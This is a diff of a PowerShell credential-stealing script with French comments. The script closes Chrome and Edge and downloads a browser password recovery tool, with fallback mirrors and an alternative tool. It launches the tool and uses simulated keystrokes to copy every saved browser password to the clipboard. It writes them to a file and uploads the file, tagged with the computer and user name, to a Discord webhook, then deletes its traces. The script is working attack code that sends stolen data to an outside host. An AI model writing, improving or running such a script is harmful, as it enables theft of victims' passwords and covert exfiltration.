@@ -9,108 +9,133 @@ function Send-Discord {
 
 Send-Discord "🟢 START - $env:COMPUTERNAME | $env:USERNAME"
 
-# NE PAS FERMER BRAVE - seulement Chrome et Edge
 Get-Process chrome,msedge -EA 0 | Stop-Process -Force -EA 0
 Start-Sleep 3
 
 Set-Location $env:TEMP
-Remove-Item WebBrowserPassView*,wbpv*,passwords.txt -Recurse -Force -EA 0
+Remove-Item wbpv*,WebBrowser*,passwords.txt -Recurse -Force -EA 0
 
-Send-Discord "📥 Step 1: Downloading WebBrowserPassView..."
+Send-Discord "📥 Downloading WebBrowserPassView..."
 
 try {
     [Net.ServicePointManager]::SecurityProtocol = 'Tls12'
     
-    # Télécharger le ZIP
+    # Essayer le lien direct NirSoft
     Invoke-WebRequest "https://www.nirsoft.net/toolsdownload/webbrowserpassview.zip" -OutFile "wbpv.zip" -UseBasicParsing
     
     if (!(Test-Path "wbpv.zip")) {
-        Send-Discord "❌ Download failed - file not created"
+        Send-Discord "❌ Download failed"
         exit
     }
     
     $zipSize = [math]::Round((Get-Item "wbpv.zip").Length / 1KB, 2)
     Send-Discord "✅ Downloaded $zipSize KB"
     
-    Send-Discord "📦 Step 2: Extracting..."
-    
-    # Extraire
-    Expand-Archive "wbpv.zip" -DestinationPath "." -Force
-    
-    # Trouver l'exe
-    $exe = Get-ChildItem -Filter "WebBrowserPassView.exe" -Recurse -EA 0 | Select -First 1
-    
-    if (!$exe) {
-        Send-Discord "❌ EXE not found after extraction"
-        $files = (Get-ChildItem | Select -First 10 -ExpandProperty Name) -join ", "
-        Send-Discord "📁 Files present: $files"
-        exit
+    # Vérifier si c'est vraiment un ZIP valide
+    if ($zipSize -lt 10) {
+        Send-Discord "⚠️ File too small - might be blocked. Trying alternative..."
+        
+        # Alternative : télécharger depuis un miroir
+        Remove-Item "wbpv.zip" -Force
+        Invoke-WebRequest "https://the-eye.eu/public/Software/nirsoft/webbrowserpassview.zip" -OutFile "wbpv.zip" -UseBasicParsing -EA 0
+        
+        if (Test-Path "wbpv.zip") {
+            $zipSize = [math]::Round((Get-Item "wbpv.zip").Length / 1KB, 2)
+            Send-Discord "📥 Alternative download: $zipSize KB"
+        }
     }
     
-    Send-Discord "✅ Found: $($exe.Name) at $($exe.DirectoryName)"
-    Send-Discord "🚀 Step 3: Launching WebBrowserPassView..."
+    Send-Discord "📦 Extracting..."
     
-    # Lancer le programme (comme le VBScript fait avec s.Run)
-    $process = Start-Process $exe.FullName -PassThru
-    
-    # Attendre que le programme charge (comme WScript.Sleep 3000)
-    Start-Sleep 4
-    
-    Send-Discord "⌨️ Step 4: Simulating Ctrl+A and Ctrl+C..."
-    
-    # Charger l'assembly pour SendKeys
-    Add-Type -AssemblyName System.Windows.Forms
-    
-    # Mettre le focus sur la fenêtre
-    $wshell = New-Object -ComObject WScript.Shell
-    $wshell.AppActivate($process.Id) | Out-Null
-    Start-Sleep 500
-    
-    # Ctrl+A (sélectionner tout) - comme s.SendKeys "^a"
-    [System.Windows.Forms.SendKeys]::SendWait("^a")
-    Start-Sleep 300
-    
-    # Ctrl+C (copier) - comme s.SendKeys "^c"
-    [System.Windows.Forms.SendKeys]::SendWait("^c")
-    Start-Sleep 700
-    
-    Send-Discord "📋 Step 5: Reading clipboard..."
-    
-    # Récupérer le clipboard (comme clipboardData = s.Exec("powershell -command Get-Clipboard"))
-    $clipboardContent = Get-Clipboard -Raw -EA 0
-    
-    # Fermer le programme (comme s.SendKeys "%{F4}")
-    $process | Stop-Process -Force -EA 0
-    
-    if ($clipboardContent -and $clipboardContent.Length -gt 50) {
-        Send-Discord "✅ Clipboard captured - $($clipboardContent.Length) chars"
+    # Extraire le ZIP
+    try {
+        Expand-Archive "wbpv.zip" -DestinationPath "wbpv_extracted" -Force
         
-        # Sauvegarder dans un fichier (comme ts.Write clipboardData)
-        $outputFile = "$env:TEMP\passwords.txt"
-        $clipboardContent | Out-File $outputFile -Encoding UTF8
+        # Lister TOUT ce qui a été extrait
+        $extractedFiles = Get-ChildItem "wbpv_extracted" -Recurse -EA 0 | Select -ExpandProperty Name
+        Send-Discord "📁 Extracted files: $($extractedFiles -join ', ')"
         
-        # Compter les mots de passe
-        $count = ([regex]::Matches($clipboardContent, "Password")).Count
-        $size = [math]::Round((Get-Item $outputFile).Length / 1KB, 2)
+        # Chercher l'exe
+        $exe = Get-ChildItem "wbpv_extracted" -Filter "*.exe" -Recurse -EA 0 | Select -First 1
         
-        Send-Discord "📤 Step 6: Uploading - $count passwords found ($size KB)"
+        if (!$exe) {
+            Send-Discord "❌ No EXE found in ZIP"
+            Send-Discord "🔄 Trying direct executable download..."
+            
+            # Fallback : télécharger directement l'exe (pas de ZIP)
+            Remove-Item wbpv* -Recurse -Force -EA 0
+            
+            # Utiliser un autre outil : BrowserPasswordDecryptor (alternative)
+            Invoke-WebRequest "https://www.securityxploded.com/download/BrowserPasswordDecryptor.zip" -OutFile "bpd.zip" -UseBasicParsing -EA 0
+            
+            if (Test-Path "bpd.zip") {
+                Expand-Archive "bpd.zip" -DestinationPath "bpd" -Force
+                $exe = Get-ChildItem "bpd" -Filter "*.exe" -Recurse | Select -First 1
+                Send-Discord "🔄 Using alternative tool: BrowserPasswordDecryptor"
+            }
+        }
         
-        # Upload vers Discord
-        curl.exe -F "file=@$outputFile" -F "content=🔑 **$count PASSWORDS EXTRACTED**`n**PC:** $env:COMPUTERNAME`n**User:** $env:USERNAME`n**Date:** $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')" $wh
+        if (!$exe) {
+            Send-Discord "❌ No executable found - download blocked or antivirus"
+            exit
+        }
         
-        Send-Discord "✅ UPLOAD SUCCESS"
+        Send-Discord "✅ Found: $($exe.Name)"
+        Send-Discord "🚀 Launching tool..."
         
-        Remove-Item $outputFile -Force
-    } else {
-        Send-Discord "❌ Clipboard empty or too small"
-        Send-Discord "⚠️ Clipboard length: $($clipboardContent.Length) chars"
+        # Lancer le programme
+        $process = Start-Process $exe.FullName -PassThru -WindowStyle Normal
+        Start-Sleep 5
+        
+        Send-Discord "⌨️ Simulating keystrokes..."
+        
+        Add-Type -AssemblyName System.Windows.Forms
+        
+        $wshell = New-Object -ComObject WScript.Shell
+        $wshell.AppActivate($process.Id) | Out-Null
+        Start-Sleep 500
+        
+        # Ctrl+A
+        [System.Windows.Forms.SendKeys]::SendWait("^a")
+        Start-Sleep 400
+        
+        # Ctrl+C
+        [System.Windows.Forms.SendKeys]::SendWait("^c")
+        Start-Sleep 800
+        
+        Send-Discord "📋 Reading clipboard..."
+        
+        $clipboardContent = Get-Clipboard -Raw -EA 0
+        
+        # Fermer
+        $process | Stop-Process -Force -EA 0
+        
+        if ($clipboardContent -and $clipboardContent.Length -gt 50) {
+            Send-Discord "✅ Got $($clipboardContent.Length) chars"
+            
+            $outputFile = "$env:TEMP\passwords.txt"
+            $clipboardContent | Out-File $outputFile -Encoding UTF8
+            
+            $count = ([regex]::Matches($clipboardContent, "Password")).Count
+            $size = [math]::Round((Get-Item $outputFile).Length / 1KB, 2)
+            
+            Send-Discord "📤 Uploading $count passwords ($size KB)..."
+            
+            curl.exe -F "file=@$outputFile" -F "content=🔑 **$count PASSWORDS**`n$env:COMPUTERNAME | $env:USERNAME" $wh
+            
+            Send-Discord "✅ SUCCESS"
+            Remove-Item $outputFile -Force
+        } else {
+            Send-Discord "❌ Clipboard empty - length: $($clipboardContent.Length)"
+        }
+        
+    } catch {
+        Send-Discord "❌ Extraction error: $($_.Exception.Message)"
     }
     
 } catch {
     Send-Discord "❌ ERROR: $($_.Exception.Message)"
 }
 
-# Nettoyage
-Remove-Item WebBrowserPassView*,wbpv* -Recurse -Force -EA 0
-
-Send-Discord "🧹 FINISHED"
+Remove-Item wbpv*,bpd*,WebBrowser*,passwords.txt -Recurse -Force -EA 0
+Send-Discord "🧹 DONE"
